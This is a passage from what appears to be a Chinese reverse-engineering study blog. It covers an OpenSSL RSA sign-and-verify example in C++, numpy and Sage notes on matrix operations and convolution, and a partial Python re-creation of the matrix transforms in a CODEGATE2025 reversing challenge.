msg_len) &lt;= 0)        handle_openssl_error();    size_t sig_len = 0;    if (EVP_DigestSignFinal(ctx.get(), NULL, &amp;sig_len) &lt;= 0)        handle_openssl_error();    std::vector&lt;unsigned char&gt; signature(sig_len);    if (EVP_DigestSignFinal(ctx.get(), signature.data(), &amp;sig_len) &lt;= 0)        handle_openssl_error();    signature.resize(sig_len);    return signature;&#125;bool verify_signature(EVP_PKEY *pkey, const unsigned char *msg, size_t msg_len,                      const unsigned char *sig, size_t sig_len) &#123;    EVP_MD_CTX_ptr ctx(EVP_MD_CTX_new(), EVP_MD_CTX_free);    if (!ctx) handle_openssl_error();    if (EVP_DigestVerifyInit(ctx.get(), NULL, EVP_sha256(), NULL, pkey) &lt;= 0)        handle_openssl_error();    if (EVP_DigestVerifyUpdate(ctx.get(), msg, msg_len) &lt;= 0)        handle_openssl_error();    int ret = EVP_DigestVerifyFinal(ctx.get(), sig, sig_len);    return ret == 1;&#125;void save_keys(EVP_PKEY *pkey) &#123;    FILE *fpri = fopen(&quot;private.pem&quot;, &quot;w&quot;);    FILE *fpub = fopen(&quot;public.pem&quot;, &quot;w&quot;);    if (!fpri || !fpub) &#123;        std::cerr &lt;&lt; &quot;无法打开文件保存密钥\\n&quot;;        exit(1);    &#125;    PEM_write_PrivateKey(fpri, pkey, NULL, NULL, 0, NULL, NULL);    PEM_write_PUBKEY(fpub, pkey);    fclose(fpri);    fclose(fpub);&#125;int main() &#123;    OpenSSL_add_all_algorithms();    ERR_load_crypto_strings();    std::string message = &quot;This is a test.&quot;;    // 生成 RSA 密钥对    EVP_PKEY_ptr key = generate_rsa_key();    std::cout &lt;&lt; &quot;[+] 密钥对生成完成\\n&quot;;    // 签名消息    std::vector&lt;unsigned char&gt; sig = sign_message(key.get(),                                (unsigned char *)message.c_str(), message.size());    std::cout &lt;&lt; &quot;[+] 签名完成，长度 = &quot; &lt;&lt; sig.size() &lt;&lt; &quot;\\n&quot;;    // 验证签名    bool ok = verify_signature(key.get(),                               (unsigned char *)message.c_str(), message.size(),                               sig.data(), sig.size());    if (ok) &#123;        std::cout &lt;&lt; &quot;[+] 签名验证成功 ✅\\n&quot;;    &#125; else &#123;        std::cout &lt;&lt; &quot;[!] 签名验证失败 ❌\\n&quot;;    &#125;    // 保存密钥    save_keys(key.get());    std::cout &lt;&lt; &quot;[+] 密钥对保存为 PEM 文件\\n&quot;;    EVP_cleanup();    CRYPTO_cleanup_all_ex_data();    ERR_free_strings();    return 0;&#125;","categories":["re学习"],"tags":["加解密、编码"]},{"title":"矩阵逆向初步学习","url":"/2025/05/01/%E7%9F%A9%E9%98%B5%E6%93%8D%E4%BD%9C%E5%AD%A6%E4%B9%A0/","content":"基本操作numpy实现\nimport numpy as np#rows行 ，cols列Z = np.zeros((rows, cols)) #创建全为0的矩阵G=np.array(list).reshape(rows,cols) #转列表为一维矩阵，并用.reshape(rows,cols)重新规划行列数rows=-1时自动识别G.tolist() #转为列表C = A @ B #矩阵乘法C = A + B # +C = A - B # -np.rot90(G,k=1) #顺时针旋转k*90度，k&lt;0时逆时针转动invA = np.linalg.inv(A) #求逆A.flatten() #降维，压缩print(np.array2string(C,max_line_width=np.inf)) #不换行输出C = A @ BA = C @ invBB = invA @ BA.astype(int) #转换类型\n\n卷积\nimport numpy as npdef conv2d(input_matrix, kernel, stride=1, padding=0):    &quot;&quot;&quot;    :param input_matrix: 输入的二维矩阵（numpy 数组）    :param kernel: 卷积核（二维 numpy 数组）    :param stride: 步幅    :param padding: 零填充数量（在输入矩阵周围填充0）    :return: 卷积后的矩阵（numpy 数组）    &quot;&quot;&quot;    input_matrix = np.array(input_matrix)    kernel = np.array(kernel)    # 获取尺寸    in_h, in_w = input_matrix.shape    k_h, k_w = kernel.shape    # 添加 padding    if padding &gt; 0:        input_matrix = np.pad(input_matrix, ((padding, padding), (padding, padding)), mode=&#x27;constant&#x27;, constant_values=0)    # 计算输出尺寸    out_h = (input_matrix.shape[0] - k_h) // stride + 1    out_w = (input_matrix.shape[1] - k_w) // stride + 1    # 创建输出矩阵    output = np.zeros((out_h, out_w))    # 进行卷积运算    for i in range(out_h):        for j in range(out_w):            region = input_matrix[i*stride:i*stride+k_h, j*stride:j*stride+k_w]            output[i, j] = np.sum(region * kernel)    return output\n\nsage实现\nfrom sage.all import Zmod, matrix# RR实数域，ZZ整数域，GF(x)有限域Fp = Zmod(2**bit - 1) #自定义域,bit为2进制位数m = matrix(Fp,rows,cols,list) #定义矩阵m = m.stack(vector(list) #矩阵后添加一行(vector规定为一个向量)m = m.insert_row(index, vector(list)) #指定行插入m[r,c] #取值m[r] #取行m.rank() #秩m.nrows() #将返回矩阵行数m.ncols() #将返回矩阵列数m.determinant() #行列式m.inverse() &amp;&amp; ~m ##求逆C = A * B #乘法，用逆求解同上A = B.solve_left(C) #A在B的左B = A.solve_right(C)#B在A的右[list(row) for row in m] #转二维列表 m.list() #按行转为列表\n\n卷积\ndef conv2d_sage(input_matrix, kernel, stride=1, padding=0, base_ring=RR):    &quot;&quot;&quot;    :param input_matrix: 输入的二维列表或矩阵    :param kernel: 卷积核（二维列表或矩阵）    :param stride: 步幅（默认为 1）    :param padding: 填充像素（默认为 0）    :param base_ring: 运算域，如 RR, ZZ, GF(7)    :return: 卷积后的矩阵（Sage Matrix）    &quot;&quot;&quot;    # 确保输入是矩阵类型    A = matrix(base_ring, input_matrix)    K = matrix(base_ring, kernel)    in_h, in_w = A.nrows(), A.ncols()    k_h, k_w = K.nrows(), K.ncols()    # 添加 padding    if padding &gt; 0:        zero_block = lambda r, c: matrix(base_ring, r, c, 0)        A = block_matrix([            [zero_block(padding, padding), zero_block(padding, in_w), zero_block(padding, padding)],            [zero_block(in_h, padding), A, zero_block(in_h, padding)],            [zero_block(padding, padding), zero_block(padding, in_w), zero_block(padding, padding)]        ])    padded_h, padded_w = A.nrows(), A.ncols()    out_h = (padded_h - k_h) // stride + 1    out_w = (padded_w - k_w) // stride + 1    output = Matrix(base_ring, out_h, out_w)    for i in range(out_h):        for j in range(out_w):            region = A.submatrix(i * stride, j * stride, k_h, k_w)            output[i, j] = sum((region * K).list())    return output\n\n演示CODEGATE2025下面用CODEGATE2025的一道题来了解一些矩阵操作。\n其实就是一些矩阵的操作，如下图\n前面的密钥填充和拓展可以直接动调获取。\n输入24*24大小的数据，断点在第一个block3()函数。这里ida有点问题调试看不到变量的数据，可以单步进入block3()函数在进行第一步操作前查看buf的值。\n\n看到矩阵的结构，其实就是用密钥和0包围了一圈，这样的26x26矩阵刚好被3x3的矩阵卷积为24x24的矩阵进行操作。\n后面的矩阵操作都基于这个24x24的矩阵，把接下来的操作用python模拟一下。\nimport numpy as npdef op1(A): #卷积操作    B = np.zeros((24, 24), dtype=int)    for i in range(24):        for j in range(24):            values = [                A[i + 2][j + 2], A[i + 2][j + 1], A[i + 2][j],                A[i + 1][j + 2], A[i + 1][j + 1], A[i + 1][j],                A[i][j + 2], A[i][j + 1], A[i][j]            ]            B[i][j] = sum(values)    return Binit = [0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x43,0x30,0x44,0x33,0x47,0x41,0x54,0x33,0x43,0x30,0x44,0x33,0x47,0x41,0x54,0x33,0x43,0x30,0x44,0x33,0x47,0x41,0x54,0x33,0x0,0x0,0x30,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x43,0x0,0x0,0x44,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x30,0x0,0x0,0x33,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x44,0x0,0x0,0x47,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x33,0x0,0x0,0x41,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x47,0x0,0x0,0x54,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x41,0x0,0x0,0x33,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x54,0x0,0x0,0x43,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x33,0x0,0x0,0x30,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x43,0x0,0x0,0x44,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x30,0x0,0x0,0x33,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x44,0x0,0x0,0x47,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x33,0x0,0x0,0x41,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x47,0x0,0x0,0x54,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x41,0x0,0x0,0x33,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x54,0x0,0x0,0x43,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x33,0x0,0x0,0x30,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x43,0x0,0x0,0x44,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x30,0x0,0x0,0x33,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x44,0x0,0x0,0x47,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x33,0x0,0x0,0x41,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x47,0x0,0x0,0x54,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x41,0x0,0x0,0x33,0x43,0x30,0x44,0x33,0x47,0x41,0x54,0x33,0x43,0x30,0x44,0x33,0x47,0x41,0x54,0x33,0x43,0x30,0x44,0x33,0x47,0x41,0x54,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0]init = np.array(init).reshape(-1,26) #把一维列表转为二维矩阵print(&quot;拓展后的矩阵：&quot;)print(np.array2string(init,max_line_width=np.inf)) #不换行打印矩阵A = op1(init.astype(int).tolist()) #3x3卷积print(&quot;卷积后的矩阵:&quot;)print(np.array2string(A,max_line_width=np.inf))A = np.rot90(A, k=-1) #顺时针旋转90度print(&quot;顺时针旋转90度:&quot;)print(np.array2string(A,max_line_width=np.inf))B = [0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1]B = np.array(B).reshape(-1,24)C = A @ B #相乘C %= 0xffffprint(&quot;A*B&quot;)print(np.array2string(C,max_line_width=np.inf))D = B @ C #相乘D %= 0xffffprint(&quot;B*C&quot;)print(np.array2string(D,max_line_width=np.inf))D = np.rot90(D, k=1) #顺时针旋转90度print(&quot;顺时针旋转90度&quot;)print(np.array2string(D,max_line_width=np.inf))E = [0x54,0x12,0x2,0x2,0x4C,0x41,0x33,0x51,0x3F,0xC,0x6,0x18,0x40,0x43,0x34,0x47,0x5F,0x22,0x62,0x21,0x5E,0x1A,0x27,0x4D,0x33,0x56,0x48,0x2C,0x10,0x4,0x49,0x2,0x1C,0x28,0x4D,0x1C,0x3F,0x2B,0x17,0x19,0x27,0x42,0x52,0x46,0x3C,0x0,0x39,0x41,0x29,0x9,0x62,0x27,0x15,0x17,0x1A,0x1D,0x19,0x48,0x56,0x12,0x0,0x4,0x37,0x4A,0x3F,0x0,0x4B,0x19,0x3F,0x37,0x39,0x24,0xE,0x59,0x15,0xB8,0x11,0x3D,0x9,0x21,0x46,0x25,0x63,0x3F,0x4,0x17,0x59,0x5F,0x3E,0x61,0x51,0x1E,0x52,0x36,0x1,0x1B,0x25,0xC,0x13,0x3A,0x8C,0x61,0x44,0x2E,0x22,0x22,0x3E,0x62,0x39,0x56,0x3E,0x1E,0x2C,0x3B,0x32,0xD,0x32,0x4F,0x4C,0x43,0x60,0x32,0x2D,0x15,0x55,0xAE,0x6,0x5A,0x22,0x11,0x53,0x55,0x2F,0x1B,0x1D,0x13,0xB,0x26,0x38,0x21,0x59,0xA,0x33,0x52,0x62,0xF,0x18,0x53,0x2B,0x2C,0x8A,0x1,0x34,0x49,0x4D,0x3,0x25,0x9,0x3F,0x18,0x5D,0x3C,0x2C,0x24,0x44,0x11,0x1,0x18,0x28,0x38,0x3A,0x4D,0x1F,0x45,0xF,0x10,0x34,0xC,0x1A,0x2E,0x5E,0x1,0x31,0x59,0x6,0x33,0x39,0x7,0x5,0x4A,0xB,0x35,0x62,0x41,0x1B,0x15,0x60,0x31,0x19,0x27,0x9C,0x4D,0x27,0x4F,0x4F,0x21,0x7,0x38,0x63,0x32,0x2A,0x58,0xF,0x2F,0x5F,0x15,0x3B,0x11,0x4F,0x5E,0x2D,0x5,0xF,0xE,0x29,0x42,0x26,0x3C,0x13,0x4F,0x12,0x2B,0x41,0x11,0x9,0x6,0x41,0x38,0xE,0x7,0x44,0x2B,0x1,0x3E,0x1A,0x53,0x43,0x2C,0x3,0xC,0x32,0x0,0x4F,0xF,0x5B,0x60,0x58,0x47,0x4B,0x10,0x6,0xA,0x31,0x47,0x19,0x10,0x35,0xA,0x4E,0x6,0x17,0x7,0x56,0x4C,0x3B,0x58,0x18,0x18,0x2E,0x4B,0x50,0x8,0x42,0x1D,0x2E,0x59,0x59,0x34,0x5E,0x16,0x42,0x4,0x12,0x47,0x20,0x21,0x2,0x20,0x34,0x5,0x78,0x44,0x15,0x40,0x60,0x2A,0x59,0x27,0x17,0x62,0x5B,0x60,0x17,0x4B,0x46,0x8,0x27,0x55,0x59,0x42,0xB,0x60,0x1E,0x58,0x51,0x96,0x3D,0x19,0x32,0x30,0x55,0x56,0x56,0x50,0x41,0x1C,0x4C,0x6,0x0,0x4C,0x5,0x2A,0x18,0x35,0x12,0x51,0x3,0x19,0x52,0x34,0x46,0x8,0xD,0x56,0x3A,0x36,0x49,0x2B,0x47,0x46,0x47,0x15,0x48,0x53,0x4A,0x18,0x24,0x43,0x9,0x28,0x18,0x26,0xC,0x36,0x5,0x70,0x61,0x4D,0x11,0x27,0x23,0x39,0x13,0x58,0x43,0x1D,0xB,0x34,0xF,0x19,0x36,0x25,0x58,0x43,0x55,0x58,0x3A,0x40,0x53,0x33,0x52,0xA,0x36,0x59,0x3B,0x9,0x31,0x59,0x4F,0x56,0x4D,0x16,0x54,0x59,0x1F,0x1B,0x41,0x60,0xA,0x51,0x4C,0x47,0x11,0x4E,0x46,0x7A,0xC,0x3D,0x19,0xE,0x2C,0x29,0x4E,0x17,0x19,0x3F,0x7,0xB,0x2E,0x28,0x52,0x4,0x5E,0x5E,0x5B,0x7,0x1D,0xC,0x4,0x0,0x12,0x22,0x4E,0x49,0x25,0x34,0x47,0x6,0x37,0x2D,0x29,0x2,0x5E,0x34,0x30,0x16,0x16,0x49,0x3B,0x1,0x4C,0x10,0x41,0x43,0x1E,0x22,0x34,0x5C,0x21,0x2,0x5F,0x18,0x22,0xB,0x26,0x5,0x2,0x4A,0x3B,0x3C,0xB,0x1C,0x4B,0x32,0x5B,0x15,0x37,0x22,0x20,0x5C,0xC0,0x5C,0x28,0x4B,0x36,0x10,0x53,0x5C,0x1C,0x51,0x0,0x4F,0x51,0x5B,0x1A,0x21,0x52,0x22,0x3E,0xC,0xF,0x1E,0x34,0xD,0x18,0x1E,0x4B,0x30,0x5C,0x29,0x14,0x5A,0x54,0x2E,0x27,0xE,0x5F,0x33,0x1F,0x1C,0x36,0x40,0x3D,0x40,0x10,0x5B,0x44,0xA,0x25,0x42,0x30,0x4,0x4,0x10,0x33,0x5B,0x9,0x2E,0x1A,0x3B,0x2D,0x58,0x59,0x8,0x5B,0x22,0x20,0x0,0x3A,0x43,0x2F,0x2F,0xB,0x54,0x18,0x8A]E = np.array(E).reshape(-1,24)F = D + E #相加F %=0xffffprint(&quot;D+E&quot;)print(np.array2string(F,max_line_width=np.inf))G = [0x6C6,0xB350,0xFB2A,0xA846,0xABD5,0xFBBA,0xD20,0xB2C4,0xBD5,0xA4F3,0x4064,0xBDCF,0x8511,0x2911,0xC4BD,0x65B6,0x7010,0x1F43,0x20F1,0x7268,0x6EF8,0x1524,0xF6A8,0x3A2,0x37CB,0xC40F,0x9720,0x13D2,0x3AA,0x4671,0xC1FC,0x2147,0xF9EF,0xB8AA,0x81EF,0x1F7A,0xDEAA,0x89BF,0xC101,0x2992,0xE50D,0x80D5,0xA7C2,0x5D2,0x9DF,0xAE25,0xCB5E,0xA5A9,0x9763,0xBAF2,0x86F8,0x9BFC,0x4435,0x70B3,0xAB91,0x44F4,0x4495,0xE241,0x43C9,0xCC02,0xA778,0x5031,0x9994,0xDBE1,0xE6CC,0xF905,0x7ED4,0x713A,0x1E87,0xA621,0xE3C5,0x2DCF,0x95C2,0xF961,0xA7E3,0xFAD7,0x2244,0xE219,0x7FFC,0x4CCD,0x5B2,0x3594,0xF6DD,0x6037,0x2C8F,0x5B3,0x3DB5,0x5361,0x9025,0xDB95,0xB3C9,0x6450,0xAE6E,0xF74F,0xB761,0xF9D0,0xA9,0xF10C,0xECBD,0xC698,0xC22,0x7EB8,0xEAA5,0xAB78,0x437F,0xBF50,0x9DA0,0x70E1,0xDBE8,0x9B40,0xB9A5,0xCBF4,0xE492,0xB5F6,0x919F,0x4B33,0x9EEF,0x5E9A,0xFFC0,0xAB7,0xF3BF,0x8283,0x41DF,0x7773,0x81B4,0xBA07,0xFD6,0x8FD3,0x5D0F,0x33B1,0xF5B0,0xFFBB,0x47B5,0xE9F7,0xD783,0xA9E6,0x96C1,0x1816,0xC30A,0xA3CD,0x7884,0xB1EC,0xC61,0xF77,0xB14A,0x8AFF,0xC779,0x626D,0xD759,0x6C81,0xCC5D,0xBD1A,0x95F5,0x5D61,0x9C9E,0x6293,0x2911,0x9758,0xB6D0,0x5BD4,0x3B98,0xDC7F,0xF27C,0x9816,0xDE49,0x8575,0xD547,0x6E36,0x8635,0x3E95,0xD8C6,0x24C7,0x6B58,0x9CEF,0xEA8C,0x582C,0xC9E0,0xBD3D,0xBC4E,0xD00C,0x3C61,0xC9F7,0xE213,0x4893,0x51C6,0xA72F,0xE1F4,0xF767,0x1A78,0x8D4F,0x423B,0xDA35,0xED13,0x228B,0xCD29,0x9F34,0x997D,0x5D1E,0xC18A,0x6159,0x6986,0x3C38,0xA076,0xFC28,0x6FC4,0x8751,0x96E0,0xFAFD,0x52C6,0x4906,0x1173,0x45C,0xDD70,0x45F3,0x5044,0x92AE,0x428A,0x29D8,0xC652,0x679D,0x213F,0xBF03,0xF0C1,0xE6A,0xBDD8,0x4591,0xB5B9,0x2558,0xA92D,0xC886,0xC02F,0x89CF,0x5395,0xC578,0x2078,0x4ADF,0xC6FF,0x6EC1,0x4A15,0x1309,0xFDED,0x468C,0x8FEB,0xAEEA,0xD873,0x1B87,0xE75B,0x80B5,0x236D,0x7097,0x6857,0x6B43,0x2BC,0x91EA,0xB01D,0x777A,0xB692,0x3918,0xD1CF,0x959E,0x572,0x59C7,0xD4FA,0xD9AB,0x904F,0x5D27,0x396C,0x4B82,0x85F2,0xA2F0,0xC88A,0x88E5,0xF4E2,0x6988,0x6496,0x4035,0x3D0E,0x15DC,0xB6DD,0xCBE4,0x2D92,0x418F,0x9AD4,0xAEDC,0xFA46,0x25E7,0x22A8,0xAEE5,0x1798,0xDFBD,0xCD93,0x58E,0x27DC,0xEAFF,0xAB5A,0x37AB,0xB78F,0x5E02,0x8E73,0x3AEC,0xF80C,0x711A,0x914C,0xDD62,0xE2D3,0x6DFE,0x3597,0x25C5,0xAD18,0xE45F,0x3808,0xEB56,0x33EA,0x6D19,0xFBCC,0xA388,0xB0FD,0xC271,0xED90,0x4095,0x440F,0x262D,0xB512,0x623A,0x6410,0x62A5,0x6995,0xA000,0xBAF9,0xE445,0x2465,0xA65E,0xB603,0xC209,0xB159,0x6C32,0x11D,0x3C2E,0xB23D,0xB479,0x9D4F,0xEF2F,0x833E,0xFE0F,0x2EB3,0x8B7B,0x61DB,0x1DC6,0x6534,0x37F1,0x908F,0xD7D,0xD25A,0xC690,0xB29,0x3220,0x97F,0x321A,0xCAC4,0x7AB,0x73AE,0xDB4E,0x4A65,0x96A0,0x64F0,0x5F45,0x1E77,0x2DE3,0xDD0C,0xA4C8,0x33DF,0xFACF,0x29B1,0x7CB,0x24AB,0x2A19,0x43F2,0x3293,0xC952,0x83EE,0xE01,0x424C,0x2CCC,0x21CB,0x701F,0x4A27,0x4E30,0x4ADC,0x846,0xDA65,0xE1F1,0xD6CF,0x15C1,0xED78,0xCFF2,0x1C69,0xEF05,0xDD53,0x2BB9,0x1401,0xEFD,0x7031,0xEFD9,0x5790,0x14B8,0xA5C6,0xFA73,0x1F8C,0x6171,0xA46B,0xC524,0x8A78,0x2DC3,0x61BC,0x4A2,0xDDC4,0x73C4,0x8C50,0xCFBC,0x3388,0x73F0,0xE94C,0x85CE,0x20BC,0x8F08,0x67E7,0xE5C8,0x69BD,0x46BF,0x69E4,0xF024,0xF5BB,0xAB91,0xC32,0x57E8,0xCC30,0xC68A,0xA5F3,0xEFBF,0x5F74,0xE7F,0x397F,0xF02B,0x2E51,0xFFE,0x32CE,0xF66A,0xA69D,0x93B1,0xE53F,0xF854,0x60B8,0xA7A2,0xEF57,0x6A86,0xC3CA,0x93E4,0xB2F1,0x590,0x8CC5,0xEEB7,0x663D,0x6311,0xDB16,0x9294,0x8299,0xBD,0xFCA1,0xD53F,0x7E60,0xFF44,0xA42C,0xA8F1,0x5175,0xE9A0,0xEB14,0xDB64,0xB072,0x3179,0x59D2,0xB7FF,0x2EE0,0xFD00,0x42FD,0x17FB,0xA871,0xD3CE,0x73B9,0x532C,0x2449,0x45A8,0xE49A,0xC3CB,0x4497,0x5841,0x11D7,0x7D08,0x46C3,0xCF5E,0x705C,0xC024,0xD07C,0x7F16,0x9D97,0x3E91,0x249F,0xE9A7,0x14E5,0x8C35,0x7A6D,0xF3E9,0xB8F6,0xDCDD,0x449D,0xA524,0xF38,0x4510,0x589D,0x78A1,0x4ABA,0xA3E5,0x9D3,0xF34B,0x5705,0xDA4D,0x3330,0x1949,0x2949,0xCE6C,0x5299,0x340,0xC795,0x98C2,0xD611,0x6212,0xB043,0x3253,0xFCF1,0x593C,0x3496,0x8D5,0xF597,0x7436,0xE146,0xCE9A,0xFDF3,0xB57C,0x59AA,0x8F34,0x6A4E,0x22F9,0xDB15,0x2CA,0x1DE0,0x1E5B,0x3A0F,0xAB47,0x7280,0x16BD,0x826B,0xFFEF,0x69A4,0xE62,0x674E,0xCDC3,0x2381,0x1187,0x12CC,0xD668,0x4DCF,0x89AC,0x75B6,0x95CD,0x1915,0xD51E,0x78B2]G = np.array(G).reshape(-1,24)H = F @ G #相乘H %= 0xffffprint(&quot;F*G&quot;)print(np.array2string(H,max_line_width=np.inf))I = 